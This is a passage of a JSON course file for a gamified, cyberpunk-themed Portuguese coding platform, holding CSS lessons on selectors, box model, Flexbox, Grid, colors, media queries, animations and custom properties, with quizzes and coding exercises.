`class=\"botao\"`, no CSS você deve escrever obrigatoriamente `.botao`.\n\n> **🛡️ Boa Prática:**\n> Prefira seletores de classe a IDs para estilização visual. Classes têm especificidade balanceada e facilitam a criação de componentes reutilizáveis.",
        "codeExample": "/* Estilo do Terminal de Neon City */\n.card-missao {\n  background: #090E1A;\n  border: 1px solid #8B5CF6;\n  border-radius: 8px;\n  padding: 20px;\n  color: #F8FAFC;\n}\n\n.card-missao h2 {\n  color: #00D4FF;\n  margin-top: 0;\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Se você criou no HTML uma tag com class=\"status-alerta\", como essa classe deve ser referenciada dentro do arquivo CSS?",
            "options": [
              "status-alerta { color: red; }",
              "#status-alerta { color: red; }",
              ".status-alerta { color: red; }",
              "*status-alerta { color: red; }"
            ],
            "correctIndex": 2,
            "explanation": "Classes no CSS são obrigatoriamente precedidas por um ponto (.) como .status-alerta, enquanto a cerquilha (#) é reservada exclusivamente para IDs."
          },
          {
            "type": "fillblank",
            "title": "Construindo o Cartão Neon",
            "instruction": "Complete a regra CSS para definir a classe, a cor de fundo e a borda do cartão.",
            "codeSnippet": "{{seletor_classe}} {\n  background-color: {{fundo}};\n  color: #FFFFFF;\n  border: 1px solid #8B5CF6;\n}",
            "blanks": [
              {
                "id": "seletor_classe",
                "placeholder": "seletor de classe",
                "expectedValues": [
                  ".card-neon",
                  ".card"
                ],
                "hint": "Lembre-se de iniciar com o ponto (.) seguido do nome da classe (ex: .card-neon)."
              },
              {
                "id": "fundo",
                "placeholder": "cor de fundo hexadecimal",
                "expectedValues": [
                  "#0b1120",
                  "#000000",
                  "#090e1a"
                ],
                "hint": "Pense em um tom escuro cyberpunk como #0b1120 ou #000000."
              }
            ],
            "explanation": "Perfeito! A sintaxe CSS está impecável com o seletor de classe prefixado por ponto e o código de cor hexadecimal válido."
          },
          {
            "type": "bughunt",
            "title": "Sintaxe Corrompida no Painel de Bordo",
            "scenario": "O desenvolvedor novato tentou criar a classe do botão de lançamento, mas a cor do texto e a borda não estão sendo aplicadas.",
            "buggyCode": "botao-ignicao {\n  color #00D4FF;\n  border: 1px solid #00D4FF;\n}",
            "expectedKeywords": [
              ".botao-ignicao",
              "color:",
              ";"
            ],
            "forbiddenKeywords": [
              "botao-ignicao {",
              "color #"
            ],
            "hint": "Verifique se falta o caractere de classe no nome do seletor e se há dois pontos separando a propriedade do valor da cor.",
            "solutionExplanation": "Bug neutralizado! A classe agora possui o ponto inicial (.botao-ignicao) e a propriedade color possui os dois pontos obrigatórios."
          }
        ]
      },
      {
        "id": "css-2",
        "title": "2. O Modelo de Caixa (Box Model)",
        "description": "Domine Content, Padding, Border, Margin e a propriedade box-sizing.",
        "duration": 15,
        "xpReward": 65,
        "language": "css",
        "content": "# 📦 O Modelo de Caixa (Box Model)\n\nNo CSS, **absolutamente tudo é uma caixa retangular**! Entender o Modelo de Caixa é o divisor de águas entre quem briga com o layout e quem tem controle cirúrgico sobre a tela.\n\n---\n\n### 🧱 As 4 Camadas da Caixa\n\nDe dentro para fora, toda caixa possui 4 camadas fundamentais:\n\n1. **Content (Conteúdo):** Onde o texto ou imagem realmente vive. Controlado por `width` e `height`.\n2. **Padding (Preenchimento Interno):** O espaço respirável entre o conteúdo e a borda. Fica **dentro** da caixa.\n3. **Border (Borda):** A moldura ao redor do padding e do conteúdo.\n4. **Margin (Margem Externa):** O espaço entre esta caixa e as outras caixas vizinhas na página.\n\n```\n+---------------------------+\n|          Margin           |\n|  +---------------------+  |\n|  |       Border        |  |\n|  |  +---------------+  |  |\n|  |  |    Padding    |  |  |\n|  |  |  +---------+  |  |  |\n|  |  |  | Content |  |  |  |\n|  |  |  +---------+  |  |  |\n|  |  +---------------+  |  |\n|  +---------------------+  |\n+---------------------------+\n```\n\n---\n\n### 🛡️ O Salvador de Vidas: `box-sizing: border-box`\n\nPor padrão no CSS antigo (`content-box`), se você definir `width: 200px` e adicionar `padding: 20px`, o navegador soma tudo: a caixa fica com **240px de largura real**! Isso quebrava layouts e causava rolagem horizontal indesejada.\n\nCom `box-sizing: border-box`, a largura que você define é a largura total final:\n\n```css\n* {\n  box-sizing: border-box;\n}\n```\n\n> **💡 Dica Pro:**\n> Praticamente todo projeto moderno no mundo real adiciona um \"CSS Reset\" no início do arquivo aplicando `box-sizing: border-box` em todos os elementos. Isso impede que espaçamentos internos aumentem o tamanho total dos componentes.\n\n> **⚠️ Armadilha Comum:**\n> Margens verticais contíguas podem sofrer de \"colapso de margens\" (*margin collapse*), onde duas margens de 20px se sobrepõem resultando em apenas 20px de distância em vez de 40px.",
        "codeExample": "/* Configuração ideal do Modelo de Caixa */\n* {\n  box-sizing: border-box;\n  margin: 0;\n  padding: 0;\n}\n\n.painel-cyber {\n  width: 320px;\n  padding: 24px;\n  border: 2px solid #00D4FF;\n  margin: 20px auto;\n  background: #0F172A;\n  border-radius: 12px;\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é o efeito de aplicar \"box-sizing: border-box\" em um elemento?",
            "options": [
              "Remove completamente as bordas e preenchimentos do elemento.",
              "Faz com que o padding e a borda sejam incluídos dentro da largura (width) total especificada.",
              "Aumenta automaticamente a margem externa para afastar elementos vizinhos.",
              "Torna o elemento invisível até que o mouse passe sobre ele."
            ],
            "correctIndex": 1,
            "explanation": "Com border-box, a largura e altura declaradas passam a ser o tamanho total definitivo do elemento, evitando que padding ou bordas façam a caixa estourar o layout."
          },
          {
            "type": "code",
            "instruction": "Crie uma classe .escudo-energia com padding de 20px, borda sólida ciano (#00D4FF) de 2px e fundo escuro (#0B1120).",
            "initialCode": "/* Digite a regra CSS abaixo */\n",
            "expectedKeywords": [
              ".escudo-energia",
              "padding:",
              "20px",
              "border:",
              "#00D4FF",
              "background"
            ],
            "hint": "Declare a classe .escudo-energia abrindo chaves. Dentro dela, configure padding: 20px;, border: 2px solid #00D4FF; e background-color: #0B1120;.",
            "solution": ".escudo-energia {\n  padding: 20px;\n  border: 2px solid #00D4FF;\n  background-color: #0B1120;\n}"
          }
        ]
      },
      {
        "id": "css-3",
        "title": "3. Flexbox & Alinhamento Espacial",
        "description": "Posicione elementos em uma dimensão com display flex, justify-content e align-items.",
        "duration": 16,
        "xpReward": 65,
        "language": "css",
        "content": "# 🌌 Flexbox & Alinhamento Espacial\n\nNo passado, alinhar elementos no centro de uma tela era uma dor de cabeça que exigia hacks com tabelas ou floats. O **Flexbox** (*Flexible Box Layout*) chegou para revolucionar a forma como distribuímos espaços e alinhamos itens.\n\n---\n\n### 🚀 Ativando o Contêiner Flexível\n\nPara usar Flexbox, você aplica `display: flex` no elemento pai (**Flex Container**). Automaticamente, todos os seus filhos diretos tornam-se **Flex Items**:\n\n```css\n.barra-navegacao {\n  display: flex;\n}\n```\n\n---\n\n### 🧭 Os Dois Eixos Fundamentais\n\nO Flexbox opera com dois eixos ortogonais:\n\n1. **Main Axis (Eixo Principal):** A direção em que os itens fluem (padrão: horizontal/linha).\n   - Controlado por: `justify-content`\n   - Opções: `flex-start`, `center`, `flex-end`, `space-between`, `space-around`.\n2. **Cross Axis (Eixo Transversal):** Perpendicular ao eixo principal (padrão: vertical).\n   - Controlado por: `align-items`\n   - Opções: `stretch` (padrão), `center`, `flex-start`, `flex-end`.\n\n---\n\n### 🎯 A Fórmula Mágica da Centralização Total\n\nPara centralizar qualquer elemento perfeitamente no meio da tela:\n\n```css\n.centralizador {\n  display: flex;\n  justify-content: center; /* Centro no eixo horizontal */\n  align-items: center;     /* Centro no eixo vertical */\n}\n```\n\n> **💡 Dica Pro:**\n> Use a propriedade `gap: 16px;` no contêiner flexível. Ela cria espaçamento automático entre os itens sem precisar adicionar margens em cada elemento filho!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer de aplicar `display: flex` no elemento pai. As propriedades `justify-content` e `align-items` só têm efeito em elementos que são contêineres flexíveis.",
        "codeExample": "/* Barra de Navegação Futurista com Flexbox */\n.navbar-nexus {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n  padding: 16px 24px;\n  background: #0B1120;\n  border-bottom: 1px solid #1E293B;\n}\n\n.nav-links {\n  display: flex;\n  gap: 20px;\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual propriedade Flexbox é responsável por alinhar os elementos ao longo do EIXO TRANSVERSAL (vertical por padrão)?",
            "options": [
              "justify-content",
              "flex-direction",
              "align-items",
              "gap-alignment"
            ],
            "correctIndex": 2,
            "explanation": "align-items controla o alinhamento no eixo transversal (cross-axis), enquanto justify-content controla o eixo principal (main-axis)."
          },
          {
            "type": "fillblank",
            "title": "Configurando a Estação Flex",
            "instruction": "Complete as propriedades para transformar a barra em um contêiner flexível distribuindo os itens com espaço entre eles.",
            "codeSnippet": ".menu-navegacao {\n  display: {{tipo_display}};\n  justify-content: {{alinhamento_principal}};\n  align-items: center;\n  gap: 16px;\n}",
            "blanks": [
              {
                "id": "tipo_display",
                "placeholder": "tipo de display",
                "expectedValues": [
                  "flex"
                ],
                "hint": "Digite o valor que ativa o Flexible Box Layout."
              },
              {
                "id": "alinhamento_principal",
                "placeholder": "distribuição espacial",
                "expectedValues": [
                  "space-between",
                  "center",
                  "space-around"
                ],
                "hint": "Pense na propriedade que empurra um item para cada extremidade (space-between)."
              }
            ],
            "explanation": "Excelente! Com display: flex e justify-content: space-between, os itens do menu se organizam harmoniosamente pelas extremidades da interface."
          },
          {
            "type": "code",
            "instruction": "Defina a classe .painel-central com display flex, itens centralizados em ambos os eixos e gap de 12px.",
            "initialCode": "/* Digite seu código Flexbox abaixo */\n",
            "expectedKeywords": [
              ".painel-central",
              "display: flex",
              "justify-content: center",
              "align-items: center",
              "gap: 12px"
            ],
            "hint": "Declare .painel-central com display: flex;, justify-content: center;, align-items: center; e gap: 12px;.",
            "solution": ".painel-central {\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  gap: 12px;\n}"
          }
        ]
      },
      {
        "id": "css-4",
        "title": "4. CSS Grid & Layouts Bi-dimensionais",
        "description": "Organize grades futuristas com grid-template-columns, fr, gap e posicionamento bi-dimensional de elementos.",
        "duration": 16,
        "xpReward": 65,
        "language": "css",
        "content": "# 📐 CSS Grid & Layouts Bi-dimensionais\n\nBem-vindo ao setor de matrizes geométricas de Neon City, cadete! Enquanto o Flexbox resolve problemas de alinhamento em 1 dimensão (linha ou coluna), o **CSS Grid** reina supremo em 2 dimensões simultâneas!\n\n> **💡 O que é CSS Grid?**\n> CSS Grid é o sistema de layout nativo mais poderoso do navegador. Ele permite dividir uma área em colunas e linhas explícitas, criando matrizes nas quais você posiciona cartões, painéis de controle e dashboards sem esforço.\n\n---\n\n### 🚀 As Propriedades do Container Grid\n\nPara ativar a grade, aplicamos `display: grid` no elemento pai:\n\n```css\n.painel-naves {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr);\n  gap: 20px;\n}\n```\n\n- **`grid-template-columns`**: Define quantas colunas existirão e suas larguras.\n- **`fr` (*fractional unit*)**: Unidade mágica que divide o espaço livre disponível proporcionalmente.\n- **`repeat(3, 1fr)`**: Atalho elegante equivalente a `1fr 1fr 1fr`.\n- **`gap`**: Define o espaçamento exato entre as colunas e linhas, sem precisar de margens negativas.\n\n---\n\n### 📱 O Grid Responsivo Sem Media Queries: `minmax()` + `auto-fit`\n\nUma das fórmulas mais aclamadas pelos engenheiros da frota:\n\n```css\n.galeria-responsiva {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));\n  gap: 16px;\n}\n```\n\nEste comando gera colunas que se recalculam automaticamente de acordo com o tamanho da tela. Se a tela diminuir, os itens vão para a próxima linha sem quebrar o layout!\n\n> **⚠️ Armadilha Comum:**\n> Usar larguras fixas (`width: 300px`) nos itens filhos do grid. Isso impede o `1fr` de calcular o espaço elástico com precisão. Deixe os filhos fluidos!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Use `gap` em vez de aplicar `margin` individual em cada item filho.\n- Combine Flexbox para os componentes internos e CSS Grid para a estrutura macro da página.\n\n> **🛡️ Regra de Ouro:**\n> Quando seu layout precisa de alinhamento preciso em colunas E linhas ao mesmo tempo, use CSS Grid. Se precisa alinhar elementos em apenas uma direção, prefira Flexbox.",
        "codeExample": ".grid-dashboard {\n  display: grid;\n  grid-template-columns: 240px 1fr;\n  grid-template-rows: auto 1fr auto;\n  gap: 1.5rem;\n  min-height: 100vh;\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "No CSS Grid, o que representa a unidade especial \"1fr\"?",
            "options": [
              "Uma fração proporcional do espaço disponível no container da grade.",
              "O tamanho fixo correspondente exatamente a 1 frame (1/60 de segundo).",
              "Uma medida calculada a partir do tamanho da fonte da tag raiz (html).",
              "Um limite mínimo de 100 pixels antes do elemento quebrar de linha."
            ],
            "correctIndex": 0,
            "explanation": "A unidade fr (fractional unit) aloca uma fração proporcional do espaço remanescente no container."
          },
          {
            "type": "code",
            "instruction": "Crie uma classe CSS chamada \".terminal-grid\" com display grid, 3 colunas iguais usando repeat e a unidade fr, e um espaçamento gap de 16px.",
            "initialCode": "/* Escreva a classe .terminal-grid aqui */\n",
            "expectedKeywords": [
              ".terminal-grid",
              "display: grid",
              "grid-template-columns",
              "repeat(3, 1fr)",
              "gap: 16px"
            ],
            "hint": "Utilize a sintaxe: display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px;",
            "solution": ".terminal-grid {\n  display: grid;\n  grid-template-columns: repeat(3, 1fr);\n  gap: 16px;\n}"
          }
        ]
      },
      {
        "id": "css-5",
        "title": "5. Cores, Gradientes & Sombras Holográficas",
        "description": "Dê vida estética com RGBA, HSL, linear-gradient e o brilho neon de box-shadow e text-shadow.",
        "duration": 15,
        "xpReward": 65,
        "language": "css",
        "content": "# 🎨 Cores, Gradientes & Sombras Holográficas\n\nBem-vindo ao coração cintilante de Neon City! Aqui você aprenderá a manipular a paleta de luzes e sombras que definem a atmosfera cyberpunk.\n\n> **💡 O Universo das Cores Modernas**\n> Esqueça os velhos nomes estáticos de cores. Interfaces modernas usam **RGBA** (com canal alfa de transparência) e **HSL** (matiz, saturação e luminosidade) para criar transições visuais ricas e temas dinâmicos.\n\n---\n\n### 🌈 Gradientes Cósmicos: `linear-gradient`\n\nGradientes criam profundidade e dinamismo quando aplicados à propriedade `background` ou `background-image`:\n\n```css\n.card-neon {\n  background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);\n  border: 1px solid rgba(0, 212, 255, 0.3);\n}\n```\n\n- **Ângulo de direção:** `135deg`, `to right`, `to bottom right`.\n- **Pontos de cor (*color stops*):** Você pode definir porcentagens para controlar onde uma cor se funde na próxima.\n\n---\n\n### ✨ O Brilho Neon com `box-shadow`\n\nO efeito de holograma é criado empilhando sombras difusas e translúcidas:\n\n```css\n.botao-cyber {\n  color: #00d4ff;\n  border: 2px solid #00d4ff;\n  box-shadow: 0 0 10px rgba(0, 212, 255, 0.5),\n              0 0 25px rgba(0, 212, 255, 0.2);\n}\n```\n\n- **Parâmetros do box-shadow:** `deslocamento-x`, `deslocamento-y`, `desfoque (blur)`, `espalhamento (spread)`, `cor`.\n- Ao usar deslocamentos `0 0` e um raio de desfoque alto, você cria um **halo de energia** ao redor do elemento!\n\n> **⚠️ Armadilha Comum:**\n> Exagerar nas sombras opacas e escuras. Sombras pesadas deixam a interface visualmente poluída e cansativa. Prefira opacidades sutis entre 0.1 e 0.4.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Verifique sempre o contraste de cor entre o texto e o fundo (proporção mínima de 4.5:1 exigida pelas diretrizes WCAG de acessibilidade).\n- Utilize a propriedade `text-shadow` para realçar títulos em cabeçalhos escuros.\n\n> **🛡️ Regra de Ouro:**\n> Brilho visual nunca deve comprometer a legibilidade das informações vitais.",
        "codeExample": ".painel-holograma {\n  background: rgba(10, 14, 23, 0.85);\n  backdrop-filter: blur(12px);\n  border: 1px solid rgba(0, 255, 136, 0.4);\n  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4),\n              0 0 15px rgba(0, 255, 136, 0.2);\n  color: #ffffff;\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual valor de deslocamento X e Y deve ser aplicado no box-shadow para gerar um brilho uniforme tipo neon ao redor de todo o componente?",
            "options": [
              "10px 10px",
              "0 0",
              "-5px -5px",
              "100% 100%"
            ],
            "correctIndex": 1,
            "explanation": "Com 0 de deslocamento horizontal e vertical, a sombra expande-se igualmente em todas as direções a partir do centro, criando um efeito de glow."
          },
          {
            "type": "fillblank",
            "title": "Criando um Gradiente Linear Cyberpunk",
            "instruction": "Preencha os valores para gerar um fundo em gradiente diagonal de 90 graus com cores neon.",
            "codeSnippet": ".fundo-espacial {\n  background: ___(90deg, #0f172a, ___);\n}",
            "blanks": [
              {
                "id": "blank-1",
                "placeholder": "função de gradiente",
                "expectedValues": [
                  "linear-gradient"
                ],
                "hint": "A função nativa do CSS para gradientes lineares."
              },
              {
                "id": "blank-2",
                "placeholder": "cor final",
                "expectedValues": [
                  "#38bdf8",
                  "#00d4ff",
                  "#8b5cf6",
                  "#10b981"
                ],
                "hint": "Insira um código hexadecimal de cor futurista (ex: #38bdf8 ou #00d4ff)."
              }
            ],
            "explanation": "A propriedade background: linear-gradient(...) combina diferentes pontos de luz em uma direção definida."
          }
        ]
      },
      {
        "id": "css-6",
        "title": "6. Design Responsivo & Media Queries",
        "description": "Adapte telas estelares para qualquer visor espacial usando @media, breakpoints e abordagem Mobile-First.",
        "duration": 16,
        "xpReward": 65,
        "language": "css",
        "content": "# 📱 Design Responsivo & Media Queries\n\nEm Neon City, cadetes operam desde relógios de pulso cibernéticos até telões panorâmicos em pontes de comando. Seu layout precisa funcionar em todos eles!\n\n> **💡 O que é Design Responsivo?**\n> É a capacidade de uma página web adaptar sua diagramação, tamanho de fontes e visibilidade de elementos com base na resolução e orientação da tela do dispositivo.\n\n---\n\n### 📐 A Meta Tag Obrigatória no HTML\n\nAntes do CSS, o arquivo HTML precisa declarar o visor no `<head>`:\n\n```html\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n```\n\nSem essa tag, navegadores de smartphones fingem ser monitores desktop de 980px, renderizando tudo minúsculo!\n\n---\n\n### 🛰️ A Sintaxe de uma Media Query\n\nMedia queries permitem aplicar regras de estilo sob condições específicas de tamanho de tela:\n\n```css\n/* Estilo base (Mobile-First) */\n.colunas-missao {\n  display: flex;\n  flex-direction: column;\n  gap: 1rem;\n}\n\n/* Telas maiores que 768px (Tablets e Laptops) */\n@media (min-width: 768px) {\n  .colunas-missao {\n    flex-direction: row;\n  }\n}\n```\n\n- **Mobile-First:** Você começa estilizando para celulares (telas pequenas) e vai expandindo com `min-width` para telas maiores. É a convenção padrão da indústria moderna!\n- **Breakpoints comuns:**\n  - `640px`: Smartphones largos.\n  - `768px`: Tablets em modo retrato.\n  - `1024px`: Laptops e desktops.\n  - `1280px+`: Monitores widescreen.\n\n> **⚠️ Armadilha Comum:**\n> Criar dezenas de media queries para cada modelo específico de celular (ex: uma para iPhone 14, outra para Galaxy S23). Defina breakpoints com base no ponto em que o seu **conteúdo** começa a ficar apertado ou desconfortável, nunca por aparelhos!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Utilize imagens com `max-width: 100%` e `height: auto` para que nunca ultrapassem a largura do container.\n- Evite unidades de largura fixa como `width: 800px`. Prefira `max-width: 800px` com `width: 100%`.\n\n> **🛡️ Regra de Ouro:**\n> Se sua página exige rolagem horizontal para ler textos em um smartphone, ela falhou no teste de aprovação de voo da frota!",
        "codeExample": "/* Configuração global para imagens responsivas */\nimg {\n  max-width: 100%;\n  height: auto;\n  display: block;\n}\n\n/* Layout responsivo com breakpoint */\n.container {\n  width: 100%;\n  padding: 1rem;\n}\n\n@media (min-width: 1024px) {\n  .container {\n    max-width: 1200px;\n    margin: 0 auto;\n    padding: 2rem;\n  }\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual é o princípio fundamental da metodologia de desenvolvimento \"Mobile-First\" no CSS?",
            "options": [
              "Desenvolver primeiro os estilos com max-width e ocultar todo o conteúdo nos computadores.",
              "Escrever os estilos padrão para dispositivos móveis e usar media queries com min-width para telas maiores.",
              "Impedir o acesso ao site através de navegadores tradicionais de desktop.",
              "Carregar folhas de estilo totalmente separadas para cada marca de smartphone."
            ],
            "correctIndex": 1,
            "explanation": "No Mobile-First, a folha de estilo começa enxuta para telas pequenas e usa media queries progressivas com min-width para enriquecer a experiência em telas maiores."
          },
          {
            "type": "code",
            "instruction": "Crie uma media query para telas com largura mínima de 768px que altere a cor do texto do seletor \"h1\" para \"#00d4ff\".",
            "initialCode": "/* Escreva a media query aqui */\n",
            "expectedKeywords": [
              "@media",
              "(min-width: 768px)",
              "h1",
              "color: #00d4ff"
            ],
            "hint": "Comece com @media (min-width: 768px) { h1 { color: #00d4ff; } }",
            "solution": "@media (min-width: 768px) {\n  h1 {\n    color: #00d4ff;\n  }\n}"
          }
        ]
      },
      {
        "id": "css-7",
        "title": "7. Transições & Animações com Keyframes",
        "description": "Crie movimento fluído usando transition, transform e ciclos de animação estelares com @keyframes.",
        "duration": 16,
        "xpReward": 65,
        "language": "css",
        "content": "# ⚡ Transições & Animações com Keyframes\n\nDê vida estelar aos seus componentes em Neon City! Elementos estáticos parecem painéis desligados; um bom hacker sabe como adicionar movimento com elegância.\n\n> **💡 Transições vs Animações**\n> - **`transition`**: Suaviza a mudança entre dois estados (como quando o usuário passa o mouse sobre um botão).\n> - **`@keyframes`**: Cria ciclos contínuos ou sequências complexas de múltiplos passos sem necessidade de interação do usuário.\n\n---\n\n### 🎚️ A Mágica de `transition` e `transform`\n\nPara criar efeitos de hover profissionais:\n\n```css\n.card-nave {\n  background: #1e293b;\n  transform: translateY(0);\n  transition: transform 0.3s ease, box-shadow 0.3s ease;\n}\n\n.card-nave:hover {\n  transform: translateY(-6px);\n  box-shadow: 0 12px 24px rgba(0, 212, 255, 0.3);\n}\n```\n\n- **Por que usar `transform`?** Propriedades como `transform` e `opacity` são processadas diretamente pela placa de vídeo (GPU) sem disparar recálculos pesados de layout no navegador (60 FPS garantidos!).\n\n---\n\n### 🌀 Animações Complexas com `@keyframes`\n\nDefina os passos da animação com porcentagens:\n\n```css\n@keyframes pulsar-reator {\n  0% {\n    transform: scale(1);\n    opacity: 0.8;\n  }\n  50% {\n    transform: scale(1.08);\n    opacity: 1;\n  }\n  100% {\n    transform: scale(1);\n    opacity: 0.8;\n  }\n}\n\n.reator-ativo {\n  animation: pulsar-reator 2s infinite ease-in-out;\n}\n```\n\n- **`infinite`**: A animação roda em loop contínuo.\n- **`ease-in-out`**: Começa devagar, acelera no meio e desacelera no final.\n\n> **⚠️ Armadilha Comum:**\n> Animar propriedades como `width`, `height`, `top` ou `left`. Isso força o navegador a recalcular o layout de todos os elementos ao redor, causando travamentos visuais. Sempre anime `transform` e `opacity`!\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Respeite usuários que sofrem de labirintite ou cinetose usando a media query `@media (prefers-reduced-motion: reduce)`.\n- Mantenha transições de botões e links curtas: entre 150ms e 300ms.\n\n> **🛡️ Regra de Ouro:**\n> Animação boa é aquela que orienta o usuário sobre o que está acontecendo, sem atrasar suas ações.",
        "codeExample": "@keyframes flutuar {\n  0%, 100% {\n    transform: translateY(0);\n  }\n  50% {\n    transform: translateY(-10px);\n  }\n}\n\n.drone-drone {\n  animation: flutuar 3s ease-in-out infinite;\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Quais propriedades CSS oferecem o melhor desempenho para animações ao serem aceleradas por hardware na GPU?",
            "options": [
              "width e height",
              "margin-top e padding-left",
              "transform e opacity",
              "border-width e top"
            ],
            "correctIndex": 2,
            "explanation": "transform e opacity não ativam as fases de Layout nem de Repaint do navegador, sendo compostas diretamente na GPU em alta taxa de quadros."
          },
          {
            "type": "bughunt",
            "title": "Otimização de Desempenho em Transições",
            "scenario": "Um cadete criou um efeito de elevação no hover animando \"top\", causando travamentos. Corrija para usar \"transform\" com aceleração gráfica.",
            "buggyCode": ".btn-acao {\n  position: relative;\n  top: 0;\n  transition: top 0.3s ease;\n}\n\n.btn-acao:hover {\n  top: -8px;\n}",
            "expectedKeywords": [
              "transform: translateY(0)",
              "transition: transform 0.3s ease",
              "transform: translateY(-8px)"
            ],
            "forbiddenKeywords": [
              "top: -8px",
              "top: 0"
            ],
            "hint": "Substitua a propriedade top por transform com a função translateY.",
            "solutionExplanation": "Utilizar transform: translateY(-8px) proporciona animações a 60 quadros por segundo sem disparar reflow da página."
          }
        ]
      },
      {
        "id": "css-8",
        "title": "8. Variáveis CSS (Custom Properties) & Temas Cyberpunk",
        "description": "Crie sistemas de design escaláveis com :root, var(--cor) e alternância dinâmica de temas claro e escuro.",
        "duration": 16,
        "xpReward": 70,
        "language": "css",
        "content": "# 🎛️ Variáveis CSS (Custom Properties) & Temas Cyberpunk\n\nÚltima missão em Neon City! Para construir interfaces profissionais e manter centenas de telas sincronizadas, desenvolvedores seniores utilizam **Variáveis Nativas do CSS** (*CSS Custom Properties*).\n\n> **💡 O que são Variáveis CSS?**\n> São entidades definidas com o prefixo `--` que armazenam valores reaproveitáveis (cores, tamanhos, fontes e sombras). Ao alterar o valor da variável em um único lugar, todo o sistema se atualiza instantaneamente!\n\n---\n\n### 🌐 Definindo Variáveis Globais no `:root`\n\nA pseudoclasse `:root` representa o topo do documento HTML, tornando as variáveis acessíveis em todo o projeto:\n\n```css\n:root {\n  --primary-color: #00d4ff;\n  --bg-dark: #0a0e17;\n  --text-main: #f8fafc;\n  --border-radius: 8px;\n}\n\nbody {\n  background-color: var(--bg-dark);\n  color: var(--text-main);\n}\n\n.botao-confirmar {\n  background-color: var(--primary-color);\n  border-radius: var(--border-radius);\n}\n```\n\n- **`var(--nome, valor-padrao)`**: Consome o valor da variável. Você pode passar um segundo parâmetro como fallback caso a variável não exista!\n\n---\n\n### 🌓 Alternância de Temas Dinâmica\n\nCriar modos Claro/Escuro torna-se trivial com variáveis:\n\n```css\n/* Tema Escuro Padrão */\n:root {\n  --bg: #0f172a;\n  --text: #ffffff;\n}\n\n/* Quando o usuário prefere tema claro ou ativa a classe .light-theme */\nbody.light-theme {\n  --bg: #ffffff;\n  --text: #0f172a;\n}\n```\n\nO JavaScript só precisa alternar a classe `light-theme` no `<body>` para repintar a aplicação inteira com eficiência quântica!\n\n> **⚠️ Armadilha Comum:**\n> Esquecer os dois hífens (`--`) no início do nome da variável. `cor-primaria: blue` é sintaxe inválida; o padrão W3C exige `--cor-primaria: blue`.\n\n---\n\n### 🛡️ Boas Práticas da Frota Estelar\n\n- Crie nomes semânticos para suas variáveis baseados na sua função (ex: `--color-surface-primary`) em vez de nomes rígidos como `--blue-dark`.\n- Agrupe suas variáveis no início da folha de estilos para facilitar a manutenção da equipe.\n\n> **🛡️ Regra de Ouro:**\n> Nunca repita um valor hexadecimal de cor mais de 3 vezes no seu CSS. Transforme-o em uma variável no `:root`!",
        "codeExample": ":root {\n  --cor-neon: #00ff88;\n  --espacamento-padrao: 1.5rem;\n  --sombra-card: 0 4px 20px rgba(0, 0, 0, 0.5);\n}\n\n.card-nexus {\n  padding: var(--espacamento-padrao);\n  border-left: 4px solid var(--cor-neon);\n  box-shadow: var(--sombra-card);\n}",
        "exercises": [
          {
            "type": "quiz",
            "question": "Qual função nativa do CSS é utilizada para ler o valor armazenado em uma Custom Property (variável)?",
            "options": [
              "get(--nome-da-variavel)",
              "var(--nome-da-variavel)",
              "$(--nome-da-variavel)",
              "read(--nome-da-variavel)"
            ],
            "correctIndex": 1,
            "explanation": "A função var(--nome) é a sintaxe oficial do CSS para recuperar o valor de uma custom property."
          },
          {
            "type": "code",
            "instruction": "Declare a variável global \"--primary-glow: #00d4ff\" no pseudo-seletor :root e aplique-a na propriedade color da classe .neon-title.",
            "initialCode": "/* Escreva o :root e a classe .neon-title aqui */\n",
            "expectedKeywords": [
              ":root",
              "--primary-glow: #00d4ff",
              ".neon-title",
              "color: var(--primary-glow)"
            ],
            "hint": "Abra :root { --primary-glow: #00d4ff; } e em seguida .neon-title { color: var(--primary-glow); }",
            "solution": ":root {\n  --primary-glow: #00d4ff;\n}\n\n.neon-title {\n  color: var(--primary-glow);\n}"
          }
        ]
      }
    ]
  },
  {
    "id": "javascript",
    "slug": "javascript",
    "name": "JavaScript",
    "planetName": "Cyber Core",
    "description": "Dê vida, dinamismo e inteligência computacional às suas aplicações.",
    "icon": "⚡",
    "color": "#FFD700",
    "language": "javascript",
    "level": "Intermediário",
    "totalXp": 520,
    "lessons": [
      {
        "id": "js-1",
        "title": "1. O Reator de Energia: Variáveis, Tipos & Operadores",
        "description": "Domine const, let, tipos de dados primitivos e a lógica do motor de execução.",
        "duration": 15,
        "xpReward": 60,
        "language": "javascript",
